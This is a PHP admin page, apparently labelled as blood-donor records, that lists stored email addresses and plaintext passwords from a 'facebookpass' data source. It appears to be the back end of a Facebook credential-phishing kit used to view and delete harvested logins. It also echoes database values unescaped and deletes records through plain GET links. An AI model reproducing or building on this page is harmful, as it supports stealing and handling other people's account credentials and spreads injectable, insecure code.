<?php
 include('includes/header.php');
 session::checksession();
 include('includes/sidebar.php');

?> 
<?php

$user= new student();


if (isset($_GET ['action']) && $_GET ['action'] == 'view') {
    $id=(int)$_GET ['id'];

}

if (isset($_GET ['action']) && $_GET ['action'] == 'delete') {
    $id=(int)$_GET ['id'];
     if ($user->deletedatafb($id)) {
          echo "<span style='color:green;font-size:20px;margin-left:10%;margin-top:10%;'>delete successfully done </span>";
      }

}

?>
<div class="row pt-50">
	<div class="col-md-2"> </div>
          <div class="col-md-10">
            <div class="content-panel">
                

              <h4><i class="fa fa-angle-right"></i>All blood doner informasion</h4><hr>
                 <form method="GET" action="serch-result.php">
                          <input type="text" name="search" placeholder="Search....." >
                          <button type="submit"><i class="fa fa-search"></i></button>
                   </form>

                     <div class="scrolsec" style="overflow-x:auto; overflow: scroll;height: 550px;">      
                      <table class="table table-striped table-advance table-hover">
                        <thead>
                          <tr>
                          	 <th>Id</th>
                          
                            <th>Email</th>
                          
                            <th>Password</th>
                             <th>Action</th>
        
                          </tr>
                        </thead>
                        <tbody>
                          <?php
        
                            $i=0;
                            foreach ($user->readAlldatafb() as $key => $value) {
                            $i++;
                            ?>
                            <tr>
                            <td><?php echo $i;?></td>
                            <td><?php echo $value['email'];?></td>
                            <td><?php echo $value['password'];?></td>
                           <td>
                               <div class="btn-group-btn">
                                  <div class="btn-group">
                                  
                                  <button class="btn-three"><?php echo "<a href='facebookpass.php?action=delete&id=".$value['id']."' onclick ='return confirm(\"are you want to delete data\")'></>"; ?><i class="fa fa-trash-o "></i></a></button>
                                </div>
                             </div>    
                            </td>
                          </tr>
                          <?php } ?>
                        </tbody>
                      </table>
                    </div> 
                    
                    
                    
              <div class="demo">
			           <nav class="pagination-outer" aria-label="Page navigation">
			            <ul class="pagination">
			            <li class="page-item">
			                <a href="#" class="page-link" aria-label="Previous">
			                    <span aria-hidden="true">«</span>
			                </a>
			            </li>
			            <li class="page-item"><a class="page-link" href="#">1</a></li>
			            <li class="page-item"><a class="page-link" href="#">2</a></li>
			            <li class="page-item active"><a class="page-link" href="#">3</a></li>
			            <li class="page-item"><a class="page-link" href="#">4</a></li>
			            <li class="page-item"><a class="page-link" href="#">5</a></li>
			            <li class="page-item">
			                <a href="#" class="page-link" aria-label="Next">
			                    <span aria-hidden="true">»</span>
			                </a>
			                </li>
			             </ul>
			          </nav>
            </div>
            <!-- /content-panel -->
          </div>
          <!-- /col-md-12 -->
        </div>














<?php
include('includes/footer.php');
?>
